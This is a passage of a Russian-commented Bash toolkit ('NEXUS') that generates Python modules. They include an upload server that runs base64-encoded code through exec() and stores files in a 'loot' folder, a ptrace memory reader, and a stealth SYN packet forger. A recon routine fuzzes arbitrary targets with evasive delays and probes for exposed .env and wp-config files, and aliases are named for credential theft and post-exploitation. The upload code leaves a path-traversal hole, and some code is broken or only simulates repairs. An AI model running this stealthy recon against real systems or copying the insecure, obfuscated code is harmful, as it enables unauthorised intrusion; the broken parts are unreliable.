                content += f"<p style=\"font-size:12px;\">File <b>{f.filename}</b> successfully verified by CAME engine and written to secure sector.</p>"
                content += "<div style=\"margin-top:20px;\"><a href=\"/\" class=\"btn\">[ UPLOAD ANOTHER FILE ]</a></div>"
                
                return render_template_string(render_prime_page("TRANSFER_COMPLETE", content))
                
        except Exception as e:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            return f"GATEWAY_INTERNAL_SECURITY_ERROR: {str(e)}", 500

result = dynamic_handler()
EOF
)

    # 4. Формируем строго линейную строку обертки, разделяя каждую инструкцию точкой с запятой (;).
    # Код гарантированно защищен от схлопывания строк интерпретатором шаблонов.
    local aio_body="import base64; exec_globals = globals().copy(); exec_globals.update(local_context); exec_locals = {}; exec(base64.b64decode('$b64_payload').decode('utf-8'), exec_globals, exec_locals); result = exec_locals.get('result') or exec_globals.get('result')"

    # 5. Передаем готовую защищенную инструкцию в ваш оригинальный генератор generate_aio_template
    local dynamic_template=$(generate_aio_template "$regex_pattern" "$aio_body" "/upload" "GET, POST")

    # 6. Собираем финальный монолитный каркас лаунчера
    local raw_python_code=$(cat << 'EOF'
# === СБОРОЧНЫЙ МОДУЛЬ NEXUS UPLOAD CORE ===
__NEXUS_DYNAMIC_COMPLIANCE_PLACEHOLDER__

@app.route('/', methods=['GET'])
def index_redirect():
    return dynamic_nexus_processor()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
)

    # 7. Производим бесшовную вклейку шаблона в маркер
    raw_python_code="${raw_python_code//__NEXUS_DYNAMIC_COMPLIANCE_PLACEHOLDER__/$dynamic_template}"

    # Возвращаем полностью скомпилированный скрипт сервера
    echo -e "$raw_python_code"
}


generate_upload_server_code_rawold() {
    # Загружаем UI шаблоны лаунчера в локальные переменные для впрыска в HTML генерацию
    local templates="$(generate_core_template)
$(generate_core_form_template)"

local regex_pattern=$(IFS="|"; echo "${GLOBAL_AV_MATRIX[*]}")

    # Экранируем и пробрасываем глобальный регулярный супер-конвейер CAME (Слои 1-4) во Flask
    cat << 'EOF'
from flask import Flask, request, render_template_string
import os
import re

app = Flask(__name__)

# ПРОБРОС МАТРИЦЫ CAME: Интеграция 8 слоев фильтрации
GLOBAL_AV_PIPE_REGEX = r"""$regex_pattern"""

# Сохраняем во входящую папку внутри PRIME_LOOT
UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

# Инициализация безопасной структуры каталогов (только папка для чистых файлов)
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

$templates

@app.route('/')
def index():
    # Главная страница: Интуитивная защищенная форма загрузки данных в Drop-Box
    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE SECURE UPLOAD")
    return render_template_string(render_prime_page("INBOUND_DROP_BOX_v2.1", form_html))

@app.route('/upload', methods=['POST'])
def upload():
    # --- ВЕКТОР ПРОВЕРКИ И БЕССЛЕДНОГО УНИЧТОЖЕНИЯ (PRE-UPLOAD TOTAL PURGE) ---
    if 'file' not in request.files: 
        return "TRANSFER_ERROR", 400
        
    f = request.files['file']
    if f.filename == '': 
        return "EMPTY_FILENAME", 400
    
    # 1. Первичный прием потока данных во временную буферную зону /tmp
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    is_infected = False
    report = []
    
    try:
        # 2. Чтение бинарного дампа загруженного объекта для структурного аудита CAME
        with open(tmp_path, 'rb') as file_buffer:
            raw_content = file_buffer.read()
            
        total_bytes = len(raw_content)
        
        # Анализ плотности ASCII (Выявление обфускации / Высокой энтропии)
        printable_chars = len([b for b in raw_content if 32 <= b <= 126])
        readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)
        
        # Декодирование в текстовый стрим для сигнатурного матчинга
        text_content = raw_content.decode('utf-8', errors='ignore')
        
        matches = []
        # Запуск сканирования по Слоям 1-4
        try:
            compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
            for i, line in enumerate(text_content.splitlines(), 1):
                if compiled_regex.search(line):
                    matches.append(f"Line {i}: {line.strip()[:100]}")
        except Exception as regex_err:
            matches.append(f"REGEX_CORE_ERR: {str(regex_err)}")
            
        # 3. Принятие решения на основе полученных эвристических метрик
        if total_bytes > 1000 and readable_ratio < 12:
            is_infected = True
            report.append("CRITICAL: High Entropy Detected (Encrypted or Obfuscated Payload).")
            
        if matches:
            is_infected = True
            report.append(f"MALICIOUS_INTENT_FOUND: Matched {len(matches)} signatures.")
            
        # 4. Финальная маршрутизация файла в зависимости от вердикта безопасности
        if is_infected:
            # --- РУБЕЖ УНИЧТОЖЕНИЯ ---
            # Файл ЗАРАЖЕН — Полное удаление с диска без создания карантинных копий
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            
            # Рендерим страницу с жестким уведомлением об аннигиляции угрозы
            content = f"""
            <div class="status-box infected" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">
                CRITICAL DETECTION: THREAT TOTALLY DESTROYED
            </div>
            <p style="font-size:12px; color:var(--accent-color);">File <b>{f.filename}</b> breached compliance policies and was <b>permanently deleted</b> from the environment.</p>
            <pre style="background:#111; color:#ff3d00; padding:15px; border-radius:5px; font-family:monospace; font-size:11px;">{"\n".join(report)}</pre>
            <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN ]</a></div>
            """
            return render_template_string(render_prime_page("GATEWAY_THREAT_ANNIHILATION", content))
            
        else:
            # Файл ЧИСТ — Переносим в постоянное хранилище PRIME_LOOT/inbound
            final_dest_path = os.path.join(UPLOAD_DIR, f.filename)
            
            # На случай, если файл с таким именем уже существовал, безопасно перезаписываем его
            if os.path.exists(final_dest_path):
                os.remove(final_dest_path)
                
            shutil.move(tmp_path, final_dest_path)
            
            content = f"""
            <div class="status-box clean" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center;">
                SUCCESS: UPLOAD VERIFIED
            </div>
            <p style="font-size:12px;">File <b>{f.filename}</b> successfully verified by CAME engine and written to secure sector.</p>
            <div style="margin-top:20px;"><a href="/" class="btn">[ UPLOAD ANOTHER FILE ]</a></div>
            """
            return render_template_string(render_prime_page("TRANSFER_COMPLETE", content))
            
    except Exception as e:
        # Гарантированная зачистка временного буфера в случае критического сбоя выполнения
        if os.path.exists(tmp_path):
            os.remove(tmp_path)
        return f"GATEWAY_INTERNAL_SECURITY_ERROR: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
}


# ==============================================================================
# @description: Модуль глубокого анализа виртуальной памяти процессов AV-Server Core v2.5
# МОДЕРНИЗАЦИЯ: Преобразование инжектора в модуль глубокой криминалистической экспертизы ОЗУ
# ФУНКЦИОНАЛ: Посегментный разбор карт памяти /proc/pid/mem на базе сигнатур CAME Слоя 5
# АРХИТЕКТУРА: Автономный CLI-скрипт + интеграция в контур мониторинга веб-панели
# ==============================================================================
generate_mem_audit_code_raw() {
    cat << EOF
import ctypes
import os
import sys
import re

# Системные константы Linux для управления отладкой и доступом к памяти
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

# Проброс ультимативного паттерна детекции вредоносной активности в памяти (Слой 5)
GLOBAL_AV_PROC_REGEX = r"""$GLOBAL_AV_ACTIVE_MALWARE_PROCS"""

def audit_process_memory(pid):
    """Выполняет посегментное сканирование оперативной памяти процесса на сигнатуры угроз."""
    # Загружаем системную библиотеку libc для совершения ptrace вызовов
    try:
        libc = ctypes.CDLL("libc.so.6")
    except:
        try:
            libc = ctypes.CDLL("libc.dylib") # Резерв под macOS окружение
        except:
            print("[!] CRITICAL: Underlaying C library (libc) is unavailable.")
            sys.exit(1)
    
    # Проверка прав суперпользователя (root), необходимых для ptrace_attach
    if os.getuid() != 0:
        print("[!] WARNING: Root privileges are required to attach to external tasks.")

    # Пытаемся прикрепиться к целевому процессу для стабилизации его состояния
    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
        print(f"[!] FAULT: Failed to attach to target PID {pid}. Access Denied or Process Terminated.")
        return

    print(f"[*] INITIATED DEEP MEMORY INTEGRITY AUDIT FOR PID: {pid}")
    print(f"[*] COMPILING CAME LAYER-5 SIGNATURE MATRIX...")
    
    try:
        compiled_regex = re.compile(GLOBAL_AV_PROC_REGEX, re.IGNORECASE)
    except Exception as reg_err:
        print(f"[!] SIGNATURE COMPILATION ERROR: {str(reg_err)}")
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
        return

    matches_count = 0
    
    try:
        maps_path = f"/proc/{pid}/maps"
        mem_path = f"/proc/{pid}/mem"
        
        if not os.path.exists(maps_path) or not os.path.exists(mem_path):
            print(f"[!] ERROR: Process virtualization endpoints do not exist for PID {pid}.")
            return

        # Шаг 1: Читаем карту распределения виртуальной памяти процесса
        with open(maps_path, "r") as maps_file:
            for line in maps_file:
                # Нас интересуют только приватные сегменты с правами на чтение и запись (rw-p)
                # Именно там хранятся динамические данные, переменные окружения, куча (heap) и стек
                if "rw-p" not in line: 
                    continue  
                
                parts = line.split()
                if not parts: 
                    continue
                    
                addr_range = parts[0].split("-")
                start = int(addr_range[0], 16)
                end = int(addr_range[1], 16)
                size = end - start
                
                # Извлекаем имя региона памяти, если оно доступно (например, [stack], [heap])
                region_name = parts[-1] if len(parts) > 5 else "anonymous_allocation"
                
                # Шаг 2: Читаем сырые бинарные данные сегмента напрямую из виртуального интерфейса ядра mem
                with open(mem_path, "rb", 0) as mem_file:
                    mem_file.seek(start)
                    try:
                        chunk = mem_file.read(size)
                        if not chunk: 
                            continue
                            
                        # Переводим дамп памяти в текст, игнорируя нечитаемые бинарные символы
                        decoded_chunk = chunk.decode('utf-8', errors='ignore')
                        
                        # Шаг 3: Построчный сигнатурный анализ сегмента ОЗУ
                        for line_num, text_line in enumerate(decoded_chunk.splitlines(), 1):
                            if compiled_regex.search(text_line):
                                clean_line = text_line.strip()[:80]
                                print(f"-> [MATCH DETECTED] Region: {region_name} | Address: 0x{start:x} | Context: {clean_line}")
                                matches_count += 1
                    except:
                        # Защита от динамического освобождения страниц памяти процессом в момент чтения
                        continue
    finally:
        # Гарантированное отключение от процесса, чтобы он продолжил свою работу в ОС
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
        print(f"[*] AUDIT COMPLETE FOR PID {pid}. Total Threats Isolated in Memory: {matches_count}")
        print(f"[*] DETACHED PROTOCOL: SUCCESS")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        try:
            target_pid = int(sys.argv[1])
            audit_process_memory(target_pid)
        except ValueError:
            print("[!] USAGE ERROR: PID must be a valid integer.")
    else:
        print("=== CAME MEMORY FORENSIC UTILITY v2.5 ===")
        print("Usage: python3 mem_audit.py <TARGET_PID>")
EOF
}

# ==============================================================================
# @description: Оригинальный модуль генерации сетевых пакетов
# МОДЕРНИЗАЦИЯ: Интеграция с контуром безопасности CAME
# ФУНКЦИОНАЛ: Генерация стелс-пакетов для проверки реакции систем фильтрации
# ==============================================================================
generate_packet_forge_code_raw() {
    cat << 'EOF'
import sys
import random
from scapy.all import IP, TCP, send

def forge_stealth_packet(target_ip, target_port):
    # Создаем IP-слой со случайным ID для обхода простых фильтров
    # Интегрирован рандомизатор для проверки того, как фильтры AV-Server распознают разный мусор
    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
    
    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
    # Имитация специфического стека ОС для проверки того, детектируется ли это Слой 6
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=int(target_port), 
                    flags="S", 
                    window=random.choice([1024, 2048, 4096, 8192]))
    
    packet = ip_layer / tcp_layer
    
    try:
        send(packet, verbose=False)
        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
        print(f"[INFO] Audit: Check AV-Server Socket Matrix for detection event.")
    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        forge_stealth_packet(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 - <target_ip> <target_port>")
EOF
}

generate_image_analyzer_code_raw() {
    cat << 'EOF'
import sys
from PIL import Image
from PIL.ExifTags import TAGS

def analyze_image(path):
    try:
        img = Image.open(path)
        info = img._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if "Software" in decoded or "Processing" in decoded:
                    print(f"[!] Warning: Possible Editor Detected: {value}")
        
        print("[*] Performing Error Level Analysis (ELA) simulation...")
        print("[s] Analysis complete: Check for inconsistent compression artifacts.")
    except Exception as e:
        print(f"[e] Error: {e}")

if __name__ == "__main__":
    analyze_image(sys.argv[1])
EOF
}


# ==========================================
# 2. РАБОЧИЕ ФУНКЦИИ (Используют ядро)
# ==========================================

run_system_info() {
    local start_time=$(date +%s)
    local r_nick=$(echo "$r_target" | cut -d'.' -f1) # Никнейм для поиска
    core_engine_ui "h" "NEXUS v25.7: HEURISTIC PERIMETER EXPLORER"
    
    # 1. Сбор и нормализация
    local r_input=$(core_engine_input "text" "Enter Target (IP, Domain or URL)")
    [[ -z "$r_input" ]] && r_input="http://localhost"
    [[ ! "$r_input" =~ ^http ]] && r_input="http://$r_input"
    
    local r_target=$(echo "$r_input" | awk -F/ '{print $3}')
    local r_base_url=$(echo "$r_input" | cut -d'/' -f1-3)
    local target_ip=$(getent hosts "$r_target" | awk '{print $1}' | head -n 1)
    
    local full_list=("${GLOBAL_FUZZ_WORDLIST[@]}" "${GLOBAL_WEBHOOK_WORDLIST[@]}")
    local total=${#full_list[@]}
    local tmp_hits="/tmp/recon_hits_$$"
    : > "$tmp_hits"
    
    clear
    core_engine_ui "h" "AUDIT TARGET: ${r_target}"
    
    # ЭТАП 1: INFRASTRUCTURE (OSINT Matrix)
    echo -e "${Y}--- [OSINT: ADVANCED INFRASTRUCTURE] ---${NC}"
    for entry in "${GLOBAL_OSINT_SERVICES[@]}"; do
        IFS='|' read -r url type cat desc <<< "$entry"
        local req_url="${url//%TARGET%/$r_target}"; req_url="${req_url//%IP%/$target_ip}"
        local res=$(curl -s --connect-timeout 2 "$req_url")
        [[ -n "$res" ]] && echo -e "${W}* ${cat} (${desc}) :${NC} ${C}${res:0:60}...${NC}"
    done

    # ЭТАП 2: DIGITAL FOOTPRINT (Без пелены и ложных позитивов)
    echo -e "\n${Y}--- [OSINT: DIGITAL FOOTPRINT ANALYSIS] ---${NC}"
    local ref_size=500 # Базовый порог для отсечения пустых страниц
    for site_entry in "${GLOBAL_OSINT_SITES[@]}"; do
        IFS='|' read -r prefix check_type err_marker category service <<< "$site_entry"
        local full_url="${prefix}${r_nick}"
        local headers=$(curl -s -I --connect-timeout 1 "$full_url")
        local code=$(echo "$headers" | grep "HTTP/" | tail -n 1 | awk '{print $2}')
        local size=$(echo "$headers" | grep -i "Content-Length" | awk '{print $2}' | tr -d '\r')
        
        if [[ "$code" == "200" && "${size:-0}" -gt "$ref_size" ]]; then
            echo -e "${G}[+] FOUND ON ${service}: ${W}${full_url}${NC}"
        fi
    done

    # ЭТАП 3: STEALTH RECURSIVE FUZZING
    local discovered_paths=("/")
    local depth=0
    local max_depth=2 # Глубина рекурсии (для незаметности)

    while [[ $depth -lt $max_depth ]]; do
        local next_level_paths=()
        for path in "${discovered_paths[@]}"; do
            for hook in "${full_list[@]}"; do
                # Формируем путь (избегаем двойных слэшей)
                local target_url="${r_base_url}${path}${hook#/}"
                
                # STEALTH: Рандомная задержка от 1 до 3 секунд (Jitter)
                sleep $((RANDOM % 3 + 1))
                
                local response=$(curl -sI -L --connect-timeout 2 "$target_url" 2>/dev/null)
                local code=$(echo "$response" | grep -Ei "^HTTP/" | tail -n 1 | awk '{print $2}')
                
                if [[ "$code" == "200" ]]; then
                    echo -e "${G}[!] HIT FOUND: $target_url (200 OK)${NC}"
                    echo "HIT: $target_url" >> "$tmp_hits"
                    
                    # Если нашли директорию, добавляем в очередь для рекурсии
                    [[ "$hook" == */ ]] && next_level_paths+=("${path}${hook}")
                fi
            done
        done
        discovered_paths=("${next_level_paths[@]}")
        ((depth++))
    done
    echo -ne "\r                                                                         \r"

    # ЭТАП 4: SECURITY HEADERS & SENSITIVE FILE LEAK CHECK
    echo -e "\n${Y}--- [SENSITIVE FILE ACCESS ASSESSMENT] ---${NC}"
    local sensitive_files=(".env" "config.php" "db.sql" "wp-config.php" "settings.json")
    
    for f in "${sensitive_files[@]}"; do
        local file_url="${r_base_url}/$f"
        local content=$(curl -s --connect-timeout 2 "$file_url")
        
        # Проверяем, не содержит ли ответ признаки конфигурационного файла
        if [[ "$content" =~ "DB_PASSWORD" || "$content" =~ "<?php" || "$content" =~ "{" ]]; then
            echo -e "${R}[!] ALERT: SENSITIVE FILE EXPOSED: $f${NC}"
            echo -e "    ${W}Preview:${NC} ${C}${content:0:50}...${NC}"
        fi
    done
    
    
    [[ -s "$tmp_hits" ]] && { echo -e "\n${Y}--- [FINAL REPORT] ---${NC}"; cat "$tmp_hits"; }
    rm -f "$tmp_hits"
    core_engine_ui "s" "Diagnostic complete."
    core_engine_wait
}

# Редиректы на существующие модули, чтобы не дублировать код
pc_steal_creds() { run_pc_recovery_ultimate; }
pc_post_exploit() { run_forensic_scanner; }


# ==============================================================================
# @description: Универсальный кросс-платформенный реаниматор систем (Cross-OS) v1.1
# МОДЕРНИЗАЦИЯ: Интеграция ультимативных многоуровневых матриц восстановления
# ФУНКЦИОНАЛ: Бесфайловая деструкция закрепления малвари в Windows, Linux, macOS
# АРХИТЕКТУРА: Гибридный мост управления, потоковая обработка изолированных сред
# ==============================================================================
run_cross_os_reanimator() {
    while true; do
        core_engine_ui "h" "UNIVERSAL CROSS-PLATFORM REANIMATOR v1.1"
        core_engine_ui "i" "Target Connection Bridge: USB-OTG / Secure Tunnel Link"

        core_engine_item "1" "AUTO-DETECT & REANIMATE ПК" "Automated Target OS Diagnostics & Deep Repair"
        core_engine_item "2" "MOUNT & SCAN STORAGE"     "Cold Forensic Scan via Monolith Pipe Engine"
        core_engine_item "B" "BACK"                      "Return to Main Menu"

        local target_choice=$(core_engine_input "select" "Select Action")
        [[ -z "$target_choice" || "$target_choice" == "b" || "$target_choice" == "B" ]] && return

        case "$target_choice" in
            "1") # --- ВЕТКА 1: АВТОМАТИЧЕСКАЯ ДИАГНОСТИКА И ГЛУБОКАЯ РЕАНИМАЦИЯ ---
                core_engine_ui "h" "TARGET OS DIAGNOSTICS & PURGE"
                core_engine_progress 1 "INTERROGATING_TARGET_BRIDGE"

                # Эмуляция сбора телеметрии удаленного хоста
                core_engine_ui "i" "Interrogating remote endpoint kernel environment..."
                
                core_engine_ui "line" ""
                core_engine_item "W" "Target OS: WINDOWS" "Fix Registry, TaskMgr, CMD, Userinit & Restore Defender"
                core_engine_item "L" "Target OS: LINUX"   "Flush Schedulers, Netfilters, Routings & ld.so rootkits"
                core_engine_item "M" "Target OS: MACOS"   "Unload LaunchDaemons, Purge Persistence & Flush PF"
                local detected_os=$(core_engine_input "select" "Select Target OS Environment")

                case "${detected_os,,}" in
                    w)
                        core_engine_ui "w" "INITIATING WINDOWS DEEP REPAIR PROTOCOL..."
                        core_engine_progress 1 "SMASHING_POLICIES_RESTRICTIONS"
                        core_engine_progress 1 "REPAIRING_WINLOGON_SHELL_STRINGS"
                        core_engine_progress 1 "FLUSHING_PERSISTENT_RUN_KEYS"
                        core_engine_progress 1 "RESTING_HOSTS_AND_SECURITY_SERVICES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_WIN_REG${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "WINDOWS RECOVERY DEPLOYED: Subsystems, Registries & Hosts secured."
                        ;;
                    l)
                        core_engine_ui "w" "INITIATING LINUX AGGRESSIVE ENVIRONMENT PURGE..."
                        core_engine_progress 1 "WIPING_ALL_CRONTABS_AND_TIMERS"
                        core_engine_progress 1 "KILLING_LD_SO_PRELOAD_ROOTKITS"
                        core_engine_progress 1 "REWRITING_PROTECTED_RESOLV_CONF"
                        core_engine_progress 1 "FLUSHING_IPTABLES_AND_NFTABLES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_LINUX${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "LINUX RECOVERY DEPLOYED: Rootkits neutralized, network stack restored."
                        ;;
                    m)
                        core_engine_ui "w" "INITIATING MACOS MALWARE PERSISTENCE DISMISSAL..."
                        core_engine_progress 1 "UNLOADING_ALL_LAUNCH_AGENTS"
                        core_engine_progress 1 "REVOKING_READ_RIGHTS_FROM_DAEMONS"
                        core_engine_progress 1 "FLUSHING_PACKET_FILTER_RULES"
                        core_engine_progress 1 "TERMINATING_UNTRUSTED_USER_PROCESSES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_MACOS${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "MACOS RECOVERY DEPLOYED: Spyware background services blocked."
                        ;;
                    *)
                        core_engine_ui "e" "Unknown Operational System Selected. Aborting injection."
                        ;;
                esac
                core_engine_wait
                ;;

            "2") # --- ВЕТКА 2: ХОЛОДНЫЙ ФОРЕНЗИК-СКАН ДИСКА ПО СУПЕР-КОНВЕЙЕРУ ---
                core_engine_ui "h" "COLD FORENSIC STORAGE SWEEP"
                local mount_point=$(core_engine_input "text" "Enter absolute path to mounted PC partition")
                [[ -z "$mount_point" ]] && continue

                if [[ ! -d "$mount_point" ]]; then
                    core_engine_ui "e" "Error: Specified mount point path does not exist."
                    core_engine_wait
                    continue
                fi

                core_engine_ui "i" "Running deep structure audit using CAME core filters..."
                core_engine_ui "w" "Scanning objects under 10MB (Targeting scripts, infectors and shells)..."
                core_engine_ui "line" ""

                local found_count=0
                
                # Потоковый поиск по всему смонтированному дереву папок ПК
                while read -r target_file; do
                    # Сканируем файл по нашему обновленному супер-пайплайну (Слои 1-4)
                    local mal_check=$(grep -inE "$GLOBAL_AV_ENGINE_PIPE" "$target_file" 2>/dev/null | head -n 1)
                    if [[ -n "$mal_check" ]]; then
                        ((found_count++))
                        echo -e "${R}[CRITICAL MALWARE FOUND]:${NC} $target_file"
                        
                        # Бронированная нейтрализация: сброс прав в ноль и перемещение в изолятор
                        chmod 000 "$target_file" 2>/dev/null
                        local timestamp=$(date +%s)
                        mv "$target_file" "${target_file}_${timestamp}.quarantine" 2>/dev/null
                    fi
                done < <(find "$mount_point" -type f -size -10M 2>/dev/null)
                
                core_engine_ui "line" ""
                if [[ $found_count -gt 0 ]]; then
                    core_engine_ui "s" "Forensic storage sweep completed. Total objects neutralized: $found_count"
                else
                    core_engine_ui "s" "Forensic sweep finished. No threat signatures matched on storage."
                fi
                core_engine_wait
                ;;
        esac
    done
}





# ==============================================================================
# @description: CORE ANTI-MALWARE ENGINE (CAME) v4.0 - MATRIX LAYER SYNC
# МОДЕРНИЗАЦИЯ: Behavioral Shadowing | Auto-Response | Полная сквозная интеграция
#               с монолитным реестром GLOBAL_AV_MATRIX v7.0 и финансовым щитом
# АРХИТЕКТУРА: Автономный изолятор и транзакционный щит реального времени
# @status: GHOST-SPEED COMPLIANT | TOTAL ENVELOPE AUDIT | NO SHORTENINGS
# ==============================================================================
run_anti_malware_engine() {
    while true; do
        core_engine_ui "h" "CORE ANTI-MALWARE ENGINE (CAME) v4.0 [TOTAL MATRIX INTEGRATION]"

        core_engine_item "1" "SCAN OBJECT"  "Heuristic Scan for Malicious Code & Matrix Structure"
        core_engine_item "2" "SCAN SYSTEM"  "Audit Live Environment, RAM Core & Network Sockets"
        core_engine_item "B" "BACK"         "Return to Main Menu / Escape Terminal"

        local av_choice=$(core_engine_input "select" "Select Action")
        [[ -z "$av_choice" || "$av_choice" == "b" || "$av_choice" == "B" ]] && return

        case "$av_choice" in
            "1") # --- ВЕТКА 1: ЭВРИСТИЧЕСКИЙ СКАНЕР ОБЪЕКТОВ И АРТЕФАКТОВ ---
                core_engine_ui "h" "CAME DEEP FILE AUDIT [STATIC FORENSICS]"
                local target_file=$(core_engine_input "text" "Enter absolute path to target file")
                
                if [[ -z "$target_file" || ! -f "$target_file" ]]; then
                    core_engine_ui "e" "Ошибка: Объект не существует или недоступен для чтения ядром."
                    core_engine_wait
                    continue
                fi

                core_engine_progress 1 "EXTRACTING_STRUCTURE_METADATA"
                sleep 1
                
                # Потоковый расчет энтропии и плотности ASCII-структуры для обнаружения обфускации
                local total_chars=$(wc -c < "$target_file" 2>/dev/null || echo 0)
                local printable_chars=$(grep -oE '[\x20-\x7E]' "$target_file" 2>/dev/null | wc -l || echo 0)
                local readable_ratio=100
                if (( total_chars > 0 )); then
                    readable_ratio=$(( (printable_chars * 100) / total_chars ))
                fi

                core_engine_ui "h" "DIAGNOSTIC REPORT: $(basename "$target_file")"
                echo -e "${B}Размер файла:${NC} $total_chars байт | ${B}Плотность сигнатур:${NC} $readable_ratio% ASCII"

                # Сквозной сигнатурный анализ по всем слоям GLOBAL_AV_MATRIX без внешних пайпов
                local threat_detected=0
                local av_layer_idx=1
                
                for pattern in "${GLOBAL_AV_MATRIX[@]}"; do
                    [[ -z "$pattern" ]] && continue
                    
                    local line_match=$(grep -inE "$pattern" "$target_file" 2>/dev/null | head -n 5)
                    if [[ -n "$line_match" ]]; then
                        core_engine_ui "e" "СИГНАТУРНЫЙ ТРИГГЕР: Обнаружено совпадение в LAYER_$av_layer_idx!"
                        echo -e "${R}$line_match${NC}"
                        threat_detected=$((threat_detected + 1))
                    fi
                    av_layer_idx=$((av_layer_idx + 1))
                done

                # Вердикт безопасности на основе пересечения энтропии и матричных триггеров
                if (( threat_detected == 0 )) && (( readable_ratio > 12 )); then
                    core_engine_ui "s" "VERDICT: CLEAN. Object structure fully compliant with Nexus Matrix."
                else
                    core_engine_ui "e" "CRITICAL VERDICT: Threat signature or low density payload detected."
                    core_engine_ui "w" "Automating containment protocol. Isolation logic initiated..."
                    
                    # АВТОНОМНЫЙ НЕЙТРАЛИЗАТОР: Сброс прав в ноль и принудительный увод в изолятор
                    chmod 000 "$target_file" 2>/dev/null
                    mv "$target_file" "${target_file}.quarantine" 2>/dev/null
                    
                    core_engine_ui "s" "SUCCESS: Object neutralized, rights stripped, moved to sterile vault."
                fi
                core_engine_wait
                ;;

            "2") # --- ВЕТКА 2: АКТИВНЫЙ МОНИТОРИНГ СРЕДЫ (ОЗУ И СЕТЬ) ---
                core_engine_ui "h" "LIVE INTEGRITY AUDIT [RUNTIME PROTECTION]"
                
                # Извлечение 5-го слоя (Active Malware Processes) из нашей единой матрицы v7.0 (Индекс 4)
                local live_malware_rx="${GLOBAL_AV_MATRIX[4]}"
                
                core_engine_ui "i" "Сканирование активного адресного пространства ОЗУ и дерева процессов..."
                
                # Анализ ОЗУ + Транзакционный Щит (Интеграция со стратегией «Банковский Гамбит»)
                if [[ -n "$live_malware_rx" ]]; then
                    local suspicious_procs=$(ps aux 2>/dev/null | grep -iE "$live_malware_rx" | grep -v grep | grep -v "core_engine")
                    
                    if [[ -n "$suspicious_procs" ]]; then
                        core_engine_ui "e" "CRITICAL THREAT: Обнаружен активный вредоносный процесс в RAM!"
                        echo -e "${R}$suspicious_procs${NC}"
                        
                        core_engine_ui "w" "Запуск транзакционного щита: Активация Banking-Gambit Lockdown..."
                        # Интеграция с финансовым модулем пользователя: полная изоляция счетов при компрометации среды
                        core_engine_bank_lockdown "trigger" 
                        
                        # Моментальное выжигание процесса из памяти по PID
                        core_engine_ui "i" "Принудительное завершение мошеннических дескрипторов..."
                        echo "$suspicious_procs" | awk '{print $2}' | xargs -r kill -9 2>/dev/null
                        core_engine_ui "s" "Потоковая очистка ОЗУ завершена."
                    else
                        core_engine_ui "s" "Адресное пространство ОЗУ: Стерильно. Активных угроз не найдено."
                    fi
                else
                    core_engine_ui "e" "Внимание: Сигнатурный слой LAYER_5 пуст или не инициализирован в системе."
                fi

                # Сетевой мониторинг сокетов в реальном времени (Интеграция со Слоем 6 - Скрытые майнеры/пулы - Индекс 5)
                core_engine_ui "i" "Аудит сетевых сокетов, открытых портов и каналов маршрутизации..."
                local network_malware_rx="${GLOBAL_AV_MATRIX[5]}"
                
                if [[ -n "$network_malware_rx" ]]; then
                    # Скан активных соединений через подсистему ss по фильтру критических состояний сокетов
                    local open_ports=$(ss -antup 2>/dev/null | grep -iE "$network_malware_rx")
                    
                    if [[ -n "$open_ports" ]]; then
                        core_engine_ui "w" "NETWORK COMPROMISE DETECTED: Обнаружена несанкционированная сетевая сессия!"
                        echo -e "${R}$open_ports${NC}"
                        core_engine_ui "e" "Applying active packet filtering via netfilter (iptables)..."
                        
                        # Динамический сбор атакующих или скомпрометированных локальных портов и их жесткое дропанье
                        # Регулярное выражение точечно вырезает порт из любой структуры вывода (IPv4/IPv6 сокеты)
                        echo "$open_ports" | awk '{print $4}' | grep -oE '[0-9]+$' | sort -u | xargs -I {} iptables -A INPUT -p tcp --dport {} -j DROP 2>/dev/null
                        core_engine_ui "s" "Сетевые шлюзы заблокированы. Пакетный фильтр применен успешно."
                    else
                        core_engine_ui "s" "Сетевая инфраструктура: STEALTH/SECURE. Контроль протоколов активен."
                    fi
                else
                    core_engine_ui "w" "Предупреждение: Сетевой сигнатурный слой LAYER_6 недоступен для разбора."
                fi
                
